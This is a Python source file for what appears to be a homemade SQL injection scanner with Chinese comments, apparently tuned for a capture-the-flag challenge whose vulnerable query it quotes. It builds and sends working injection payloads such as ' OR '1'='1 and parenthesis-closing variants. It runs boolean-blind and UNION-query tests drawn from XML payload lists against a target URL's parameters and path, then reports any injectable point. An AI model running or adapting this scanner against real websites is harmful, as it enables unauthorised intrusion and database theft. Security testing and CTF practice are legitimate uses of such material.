from lib.utils.http import send_request
import urllib.parse
import re
import time
import random

class Scanner:
    def __init__(self, url, parser):
        self.url = url
        self.parser = parser
        self.dbms = None

    def detect_injection(self):
        print(f"[*] Testing for SQL injection at: {self.url}")

        # 测试布尔盲注
        boolean_payloads = self.parser.get_payloads("boolean_blind")
        if boolean_payloads:
            self._test_boolean_blind(boolean_payloads)
        else:
            print("[-] No boolean blind payloads found")

        # 测试UNION查询注入
        union_payloads = self.parser.get_payloads("union_query")
        if union_payloads:
            self._test_union_query(union_payloads)
        else:
            print("[-] No UNION query payloads found")

    def _test_boolean_blind(self, payloads):
        print("[*] Testing boolean-based blind injection...")
        found = False
        
        # 从URL中提取参数和基础URL
        parsed_url = urllib.parse.urlparse(self.url)
        base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # 如果URL没有参数，尝试常见参数名和路径注入
        if not params:
            print("[*] URL has no parameters, testing path-based injection...")
            # 尝试路径注入
            self._test_path_injection(base_url)
        else:
            # 有参数的情况，尝试对每个参数进行注入测试
            for param_name, param_values in params.items():
                original_value = param_values[0]
                
                # 保存原始响应作为基准
                original_response = send_request(self.url)
                
                # 使用针对CTF题目的特定payload测试（字符型注入）
                # 根据题目信息：$sql = "select username,password from user where username !='flag' and id = '".$_GET['id'].'" limit 1;"
                # 这是一个典型的字符型注入点，需要使用特定的payload
                char_based_payloads = [
                    original_value + "'",  # 单引号测试
                    original_value + "'--+",  # 单引号加注释
                    original_value + "' OR '1'='1",  # OR条件注入
                    original_value + "' OR '1'='1'--+",  # OR条件加注释
                    original_value + "') OR ('1'='1",  # 括号闭合+OR条件
                    original_value + "') OR ('1'='1')--+"  # 括号闭合+OR条件+注释
                ]
                
                print(f"[*] Testing parameter: {param_name}")
                
                for test_value in char_based_payloads:
                    # 构建修改后的查询字符串
                    new_params = {k: v for k, v in params.items()}
                    new_params[param_name] = [test_value]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    
                    # 构建测试URL
                    test_url = base_url + "?" + new_query
                    
                    # 发送请求并比较响应
                    response = send_request(test_url)
                    
                    # 更智能的响应比较方法
                    if self._compare_responses(original_response, response):
                        print(f"[+] Possible SQL injection found in parameter: {param_name}")
                        print(f"[+] Payload: {test_value}")
                        print(f"[+] URL: {test_url}")
                        found = True
                        break
                
                if found:
                    break
        
        # 尝试基于XML文件的更复杂payload测试
        if not found:
            for test in payloads.findall("test"):
                try:
                    title = test.find("title").text
                    vector = test.find("vector")
                    request_payload = test.find("request/payload")
                    
                    if vector is not None and vector.text and request_payload is not None and request_payload.text:
                        # 替换占位符，特别处理[INFERENCE]占位符
                        payload_text = vector.text
                        
                        # 针对布尔盲注创建有效的INFERENCE条件
                        rand_num = random.randint(1, 10000)
                        rand_num1 = random.randint(1, 10000)
                        while rand_num1 == rand_num:
                            rand_num1 = random.randint(1, 10000)
                        
                        # 替换payload中的占位符
                        payload = payload_text.replace("[INFERENCE]", f"{rand_num}={rand_num}")
                        payload = self.parser.replace_placeholders(payload, "NULL", 1, 5)
                        
                        # 构建比较用的payload
                        comparison_text = test.find("response/comparison").text
                        if comparison_text:
                            comparison_payload = comparison_text.replace("[INFERENCE]", f"{rand_num}={rand_num1}")
                            comparison_payload = self.parser.replace_placeholders(comparison_payload, "NULL", 1, 5)
                        
                        # 针对有参数的URL，将payload应用到参数值
                        if params:
                            param_name = list(params.keys())[0]
                            param_value = params[param_name][0]
                            
                            # 构建测试URL
                            new_params = {k: v for k, v in params.items()}
                            new_params[param_name] = [param_value + payload]
                            new_query = urllib.parse.urlencode(new_params, doseq=True)
                            test_url = base_url + "?" + new_query
                            
                            # 构建比较用URL
                            if comparison_payload:
                                compare_params = {k: v for k, v in params.items()}
                                compare_params[param_name] = [param_value + comparison_payload]
                                compare_query = urllib.parse.urlencode(compare_params, doseq=True)
                                compare_url = base_url + "?" + compare_query
                                
                                # 发送请求并比较
                                response = send_request(test_url)
                                compare_response = send_request(compare_url)
                                
                                if self._compare_responses(response, compare_response, inverse=True):
                                    print(f"[+] Found boolean-based blind injection: {title}")
                                    print(f"[+] Payload: {payload}")
                                    print(f"[+] URL: {test_url}")
                                    found = True
                                    break
                        else:
                            # 无参数URL，测试路径注入
                            test_url = base_url + payload
                            response = send_request(test_url)
                            
                            if comparison_payload:
                                compare_url = base_url + comparison_payload
                                compare_response = send_request(compare_url)
                                
                                if self._compare_responses(response, compare_response, inverse=True):
                                    print(f"[+] Found boolean-based blind injection: {title}")
                                    print(f"[+] Payload: {payload}")
                                    print(f"[+] URL: {test_url}")
                                    found = True
                                    break
                except Exception as e:
                    # 忽略解析错误，继续尝试其他payload
                    print(f"[-] Error testing payload: {e}")
                    continue
        
        if not found:
            print("[-] No boolean-based blind injection found")
        
    def _test_path_injection(self, base_url):
        """测试路径注入"""
        # 使用简单的字符型注入payload
        test_payloads = ["'", "'--+", "' OR '1'='1", "' OR '1'='1'--+", "') OR ('1'='1"]
        
        # 保存原始响应作为基准
        original_response = send_request(base_url)
        
        for payload in test_payloads:
            test_url = base_url + payload
            response = send_request(test_url)
            
            # 比较响应长度或内容相似度来检测注入
            if self._compare_responses(original_response, response):
                print("[+] Possible boolean-based blind injection found with simple payload!")
                print(f"[+] Payload: {payload}")
                print(f"[+] URL: {test_url}")
                return True
        
        return False
    
    def _compare_responses(self, response1, response2, inverse=False):
        """比较两个响应，判断是否存在注入"""
        # 基本的长度比较
        if len(response1) != len(response2):
            return True if not inverse else False
        
        # 查找常见的SQL错误关键词
        error_keywords = ["sql syntax", "mysql error", "postgresql error", "oracle error", "mssql error"]
        for keyword in error_keywords:
            if keyword.lower() in response2.lower() and keyword.lower() not in response1.lower():
                return True if not inverse else False
        
        # 比较响应内容的相似度（简单实现）
        similarity = self._calculate_similarity(response1, response2)
        if similarity < 0.8:
            return True if not inverse else False
        
        return False if not inverse else True
        
    def _calculate_similarity(self, str1, str2):
        """计算两个字符串的简单相似度"""
        # 简单实现，使用长度的交集除以并集
        if not str1 or not str2:
            return 0.0
            
        # 转换为集合
        set1 = set(str1)
        set2 = set(str2)
        
        # 计算交集和并集大小
        intersection = len(set1 & set2)
        union = len(set1 | set2)
        
        # 避免除零错误
        if union == 0:
            return 0.0
            
        return intersection / union

    def _test_union_query(self, payloads):
        print("[*] Testing UNION query injection...")
        for test in payloads.findall("test"):
            title = test.find("title").text
            vector = test.find("vector").text
            char_type = test.find("request/char").text

            # 替换占位符
            payload = self.parser.replace_placeholders(vector, char_type, 1, 5)

            # 发送请求并检查响应
            response = send_request(self.url + payload)
            if "union all select" in response.lower():
                print(f"[+] Found UNION query injection: {title}")
                print(f"[+] Payload: {payload}")
                break